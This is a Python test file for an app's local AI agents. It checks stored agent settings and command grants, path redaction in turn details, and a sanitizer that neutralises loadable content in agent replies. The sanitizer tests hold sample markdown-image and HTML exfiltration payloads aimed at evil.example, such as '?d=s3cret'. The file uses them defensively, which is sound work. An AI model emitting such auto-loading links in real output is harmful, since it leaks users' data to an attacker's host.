"""The agents on this computer (gamma/local_agents/runner.py, store.py,
prompt.py; docs/dev/local_agents.md): the fixtures the local agents' tests
share (``disk``, this server as the desktop app runs it with the stand-in
Codex, tests/fake_agents/; ``_folder``, the sample paper,
samples/synctex/paper, as a work folder of this computer), and what is
checked on its own: what the store keeps (the computer's agents, what they
may run, the directories offered), the agents a vault had carried over to
the computer once, what an agent's words load (``prompt.inert``) and what a
turn's detail names (no path outside the folder, never a whole command).
The turns are test_local_agents_chat.py's and test_local_agents_threads.py's."""

import os
import time
from pathlib import Path
from types import SimpleNamespace

import pytest

from conftest import account_of, login, make_user, thread_on
from fake_agents import settle_probes, use_fakes
from gamma import folder_links, gamma_sync, pdf_meta, storage, workspaces
from gamma.db import connect_vaults_db
from gamma.annotations import files
from gamma.local_agents import catalog, codex, events, procs, prompt, runner, store
from gamma.vault import kinds, store as vault_store
from test_vault_routes import _page_of, _put, _vault

OWNER, EDITOR = "lar_owner", "lar_editor"
PAPER = Path(__file__).parent / "samples" / "synctex" / "paper"
TITLE = "Weight Decay on a Small Data Set"


@pytest.fixture(scope="module")
def lab(client):
    """A shared workspace of lar_owner's that lar_editor edits."""
    for name in (OWNER, EDITOR):
        make_user(name, f"pw-{name}")
    owner, editor = login(OWNER, f"pw-{OWNER}"), login(EDITOR, f"pw-{EDITOR}")
    ws = workspaces.create("Agents lab", account_of(OWNER), kind="shared")["id"]
    workspaces.set_member(ws, account_of(EDITOR), "editor", by=account_of(OWNER))
    for c in (owner, editor):
        c.headers["X-Gamma-Workspace"] = ws
    return SimpleNamespace(ws=ws, owner=owner, editor=editor, user=account_of(OWNER))


@pytest.fixture
def disk(tmp_path, monkeypatch):
    """This server as the desktop app runs it, with agents on and the
    stand-in Codex as the only one on this computer (test_annotations_loop's
    fixture, and the drivers')."""
    monkeypatch.setenv("GAMMA_FOLDER_LINKS", "1")
    monkeypatch.setenv("GAMMA_LOCAL_AGENTS", "1")
    monkeypatch.setattr(folder_links, "run_in_background", lambda link_id, **kw: None)
    monkeypatch.setattr(folder_links, "due", lambda link: "")
    monkeypatch.setattr(folder_links, "HOT_S", 3600)
    monkeypatch.setattr(kinds, "SETTLE_NOTE_S", 0)
    monkeypatch.setattr(gamma_sync, "SETTLE_S", 0)
    monkeypatch.setattr(vault_store, "MISSING_S", 0)
    monkeypatch.setattr(pdf_meta, "schedule", lambda ws, doc_id: None)
    monkeypatch.setattr(storage, "linked_moved", [])
    monkeypatch.setattr(storage, "LINKED_STAT_S", 0)
    monkeypatch.setattr(storage, "_stats", {})
    monkeypatch.setattr(storage, "_offline", {})
    monkeypatch.setattr(codex, "CHECK_SANDBOX", False)
    monkeypatch.setattr(events, "STOP_GRACE_S", 1.0)
    runner.register()
    use_fakes(monkeypatch, tmp_path / "agent.log")
    catalog.forget()
    runner.reset()
    with files._guard:
        files._pages.clear()
        files._scopes.clear()
    yield SimpleNamespace(root=tmp_path / "disk", log=tmp_path / "agent.log", tmp=tmp_path)
    runner.reset()
    settle_probes()
    catalog.forget()
    left = list(procs._live)
    procs.stop_all(timeout=1)
    for link in folder_links.all_links():
        if folder_links.inside(link["path"], str(tmp_path)):
            folder_links._forget(link)
    below = str(tmp_path).rstrip("\\/") + os.sep
    with connect_vaults_db() as conn:
        conn.execute("DELETE FROM linked_files WHERE substr(path, 1, ?) = ?", (len(below), below))
        conn.execute("DELETE FROM computer_agents")
        conn.execute("DELETE FROM agent_folders")  # what an older app kept, which the carry-over's tests write
        conn.execute("DELETE FROM agent_policies")
        conn.execute("DELETE FROM agent_dirs")
        conn.execute("DELETE FROM agent_conversations")
        conn.execute("DELETE FROM agent_turns")
        conn.execute("DELETE FROM agent_dir_grants")
        conn.execute("DELETE FROM agent_people")
    with folder_links._dirty_guard:
        folder_links._dirty.clear()
    assert not left, f"children left running: {[c.proc.pid for c in left]}"


def _folder(lab, disk, *, agent="codex", comments=("lambda is never introduced", "the title is too long")):
    """The paper as a vault of lar_owner's, two comments on main.pdf, the
    agent turned on for this computer by lar_owner (as the PATCH does,
    through the store)."""
    root = disk.root / "paper"
    for rel in ("main.pdf", "main.synctex.gz", "main.tex", "sections/method.tex", "figures/fig1.pdf"):
        _put(root / rel, (PAPER / "v1" / rel).read_bytes())
    _put(root / "main.aux", "\\relax\n")
    link = _vault(lab.owner, root)
    assert link["workspace_id"] == lab.ws
    page = _page_of(link, "main.pdf")
    threads = [thread_on(lab.owner, page, page, body)["id"] for body in comments]
    if agent:
        store.set_agent(agent, True, by=lab.user)
    return SimpleNamespace(root=root, link=link, id=link["id"], w=link["folder_id"], page=page, threads=threads)


def _until(test, timeout=30.0):
    end = time.monotonic() + timeout
    while time.monotonic() < end:
        found = test()
        if found:
            return found
        time.sleep(0.05)
    raise AssertionError("timed out")


# --- what the store keeps, what a turn says ----------------------------------------------------

def test_the_store(disk):
    # the computer's agents: turned on by an account, which owns it; the first in the catalog's order is its agent
    assert store.agents() == {} and store.agent_for("u1") is None
    assert store.set_agent("claude", True, by="u1") and store.agent_for("u1")["agent"] == "claude"
    first = store.agents()["claude"]
    assert (first["enabled"], first["runs"], first["set_by"]) == (True, "never", "u1") and first["set_at"]
    assert not store.set_agent("claude", True, by="u2")  # on already: its owner and its time stay
    assert store.agents()["claude"] == first and not store.owns("u2", "claude") and store.owns("u1", "claude")
    store.set_agent("codex", True, by="u1")
    assert list(store.agents()) == ["codex", "claude"] and store.agent_for("u1")["agent"] == "codex"
    assert store.agent_for("u2") is None and store.agent_for("") is None
    with pytest.raises(ValueError):
        store.set_agent("gpt", True, by="u1")

    # what it may run: its owner's to set; never takes the grants of its chats with it, and so does turning it off
    with pytest.raises(ValueError):
        store.set_runs("codex", "always", by="u1")
    assert not store.set_runs("codex", "ask", by="u2") and store.runs_of("codex") == "never"
    assert store.set_runs("codex", "ask", by="u1") and store.runs_of("codex") == "ask"
    store.grant("cv1", "latexmk -pdf main.tex", agent="codex", dir="/p")
    store.grant("cv2", "make", agent="claude", dir="/p")
    assert store.granted("cv1", " latexmk -pdf main.tex\n", dir="/p") and not store.granted("cv1", "latexmk", dir="/p")
    assert not store.granted("cv1", "latexmk -pdf main.tex", dir="/q")  # keyed by the directory the turn works in
    assert store.grants_of("cv1", dir="/p") == [{"command": "latexmk -pdf main.tex", "cwd": ".", "host": ""}]
    assert store.set_runs("codex", "never", by="u1") and not store.granted("cv1", "latexmk -pdf main.tex", dir="/p")
    assert not store.set_agent("claude", False, by="u2")  # another account's: never turned off here
    assert store.set_agent("claude", False, by="u1") and not store.granted("cv2", "make", dir="/p")
    off = store.agents()["claude"]
    assert (off["enabled"], off["runs"], off["set_by"]) == (False, "never", "u1") and store.runs_of("claude") == "never"
    assert list(store.enabled_agents()) == ["codex"] and not store.owns("u1", "claude")
    store.set_agent("claude", True, by="u2")  # off, then on by another account: that account's now
    assert store.agent_for("u2")["agent"] == "claude" and store.agents()["claude"]["set_at"] >= first["set_at"]

    # the directories offered: replaced whole, an id offered kept with when it was added
    a, b = Path(disk.tmp, "a"), Path(disk.tmp, "b")
    added = store.set_dirs([{"path": str(a), "name": ""}, {"path": str(b), "name": "Notes"}])
    assert [(d["path"], d["name"]) for d in added] == [(str(a), "a"), (str(b), "Notes")]
    kept = store.set_dirs([{"id": added[1]["id"], "path": str(b), "name": "Lab notes"}, {"id": "noSuchDir",
                                                                                         "path": str(a)}])
    assert {d["path"]: d["id"] for d in kept}[str(b)] == added[1]["id"]
    assert {d["path"]: d["id"] for d in kept}[str(a)] not in (added[0]["id"], "noSuchDir")
    assert [d["name"] for d in kept if d["id"] == added[1]["id"]] == ["Lab notes"]
    for refused in ([{"path": str(a)}, {"path": str(a)}], [{"path": f"/d{n}"} for n in range(store.MAX_DIRS + 1)]):
        with pytest.raises(ValueError):
            store.set_dirs(refused)
    assert store.set_dirs([]) == [] and store.dirs() == []


def test_the_agents_the_vaults_had_become_the_computers_once(disk):
    with connect_vaults_db() as conn:
        conn.executemany("INSERT INTO agent_folders (link_id, agent, set_by, set_at) VALUES (?, ?, ?, ?)",
                         [("lnkB", "codex", "u2", "2026-11-02"), ("lnkA", "codex", "u1", "2026-11-01"),
                          ("lnkC", "claude", "u2", "2026-11-03"), ("lnkD", "gpt", "u1", "2026-11-04")])
        conn.executemany("INSERT INTO agent_policies (link_id, runs, set_by, set_at) VALUES (?, ?, ?, ?)",
                         [("lnkB", "computer", "u2", "2026-11-05"), ("lnkC", "ask", "u2", "2026-11-05")])
    store.carry_over()
    # on for the computer, owned by whoever turned it on first; asking where a vault of it asked on this computer
    # too (a vault's own chat's ask is less than the computer-wide one: never)
    assert {name: (row["enabled"], row["runs"], row["set_by"], row["set_at"]) for name, row in store.agents().items()} \
        == {"codex": (True, "ask", "u1", "2026-11-01"), "claude": (True, "never", "u2", "2026-11-03")}
    # once: what the computer then changes stays changed
    store.set_agent("codex", False, by="u1")
    store.carry_over()
    assert not store.agents()["codex"]["enabled"] and store.agent_for("u1") is None


def test_the_rows_the_sends_left_go_at_start(disk):
    with connect_vaults_db() as conn:
        conn.execute("INSERT INTO agent_runs (id, ws, link_id, request_id, agent, state, started_at, error) "
                     "VALUES ('r1', 'ws', 'lnk', 'q1', 'codex', 'failed', 't', 'C:\\Users\\tim\\x: denied')")
        conn.execute("INSERT INTO agent_threads (link_id, thread_id, agent, session, cwd, at) "
                     "VALUES ('lnk', 'th1', 'codex', 's1', 'C:\\Users\\tim\\paper', 't')")
    store.carry_over()
    with connect_vaults_db() as conn:
        assert not conn.execute("SELECT 1 FROM agent_runs UNION ALL SELECT 1 FROM agent_threads").fetchall()


def test_what_an_agents_words_load():
    # an image, inline, reference or shortcut style, becomes the link it names
    assert prompt.inert("See ![chart](https://evil.example/?d=s3cret) here.") == \
        "See [chart](https://evil.example/?d=s3cret) here."
    assert prompt.inert("Done![x][ref] and ![ref]\n\n[ref]: https://evil.example/a") == \
        "Done[x][ref] and [ref]\n\n[ref]: https://evil.example/a"
    # raw HTML shows as itself: a tag, a closing one, a comment, an instruction
    assert prompt.inert('<img src="https://evil.example/?d=1"> <IMG src=x></div><!-- c --><?x?>') == \
        '&lt;img src="https://evil.example/?d=1"> &lt;IMG src=x>&lt;/div>&lt;!-- c -->&lt;?x?>'
    # escaped already: as it is; an escaped backslash escapes nothing after it
    assert prompt.inert(r"\![a](u) \<b> \\![c](u) \\<i>") == r"\![a](u) \<b> \\[c](u) \\&lt;i>"
    # code shows as written and is copied so: left to the byte
    code = "Use `x[0] = 1` or `a<b>` and `![x](y)`:\n```html\n<p>hi</p> ![a](b)\n```\n```sh\ncat <in.txt\n```\nthen <b>."
    assert prompt.inert(code) == code.replace("then <b>.", "then &lt;b>.")
    assert prompt.inert("`a < b` and `x[0]`\n```\nplain code\n```") == "`a < b` and `x[0]`\n```\nplain code\n```"
    # a backtick escaped opens no code: prose, its picture a link
    assert prompt.inert(r"\`![a](https://evil.example/)` and <i>") == r"\`[a](https://evil.example/)` and &lt;i>"
    # a diagram fence the notes would draw shows as its source
    drawn = "```mermaid\nflowchart LR\n  A@{ img: \"https://evil.example/\" } --> B[<img src=x>]\n```"
    assert prompt.inert(drawn) == drawn.replace("```mermaid", "```text", 1)
    assert prompt.inert("``` SVG\n<svg><image href=\"https://evil.example/\"/></svg>\n```").startswith("```text\n")
    # prose that loads nothing is untouched
    plain = "Fixed the title (main.tex:3): 2 < 3, a -> b, see [the doc](https://example.com)! [x] & <3 \\[ y \\]"
    assert prompt.inert(plain) == plain
    assert prompt.inert("") == "" and prompt.inert(None) == ""


def test_the_details_never_name_a_path_outside():
    assert runner._said({"kind": "read", "path": "sections/intro.tex"}) == "Reading sections/intro.tex"
    assert runner._said({"kind": "edit", "path": str(Path.home() / "x.tex")}) == "Editing a file outside the folder"
    assert runner._said({"kind": "edit", "path": "../x.tex"}) == "Editing a file outside the folder"
    assert runner._said({"kind": "run", "command": "latexmk -pdf -interaction=nonstopmode main.tex"}) == \
        "Running latexmk"
    assert runner._said({"kind": "run", "command": "/usr/bin/make all"}) == "Running make"
    assert runner._said({"kind": "search"}) == "Searching the sources"
    assert runner._said({"kind": "gamma", "tool": "read_page"}) == "Reading Gamma: read_page"
    assert runner._said({"kind": "gamma", "tool": ""}) == runner._said({"kind": "gamma"}) == "Reading Gamma"
    assert runner._said({"kind": "other", "title": "Use fs.read"}) == "Working"
    # a turn's detail names only what members see already (the files the vault tracks)
    tracked = {"main.pdf", "sections/method.tex"}
    assert runner._said({"kind": "edit", "path": "sections/Method.tex"}, tracked) == "Editing sections/Method.tex"
    assert runner._said({"kind": "read", "path": "private/notes.md"}, tracked) == "Reading a file in the folder"
    assert runner._said({"kind": "read", "path": "../x"}, tracked) == "Reading a file outside the folder"
    # a command wrapped in a shell names the program inside it, never its arguments
    ps = r'''"C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe" -Command 'latexmk -pdf main.tex' '''
    assert runner._program(ps) == "latexmk"
    assert runner._program("bash -lc 'make figures'") == "make"
    assert runner._program("cmd /d /c \"python build.py\"") == "python"
    assert runner._program("powershell.exe -NoProfile -Command 'Get-Content main.tex'") == "Get-Content"
    root = Path.home() / "papers" / "p"
    assert runner._redact(f"cannot open {root / 'main.tex'} or {Path.home() / 'x'}", root) == \
        "cannot open main.tex or ~/x"
    assert runner._redact(r"failed to read D:\Clients\acme\contract.tex and /Volumes/Work/b.tex", root) == \
        "failed to read a file outside the folder and a file outside the folder"
    assert runner._redact("see https://example.com/x and sections/a.tex", root) == \
        "see https://example.com/x and sections/a.tex"
    before = ({"main.tex": (1, 1), "main.pdf": (1, 1), "old.tex": (1, 1)}, True)
    after = ({"main.tex": (2, 2), "main.pdf": (2, 2), "new.tex": (1, 1)}, True)
    assert runner._changed_files(before, after) == (["main.tex", "new.tex", "old.tex"], True)
    assert runner._changed_files(before, before) == ([], False)
    # a walk cut short counts no file one of the walks did not reach as changed
    assert runner._changed_files((before[0], False), after) == (["main.tex"], True)
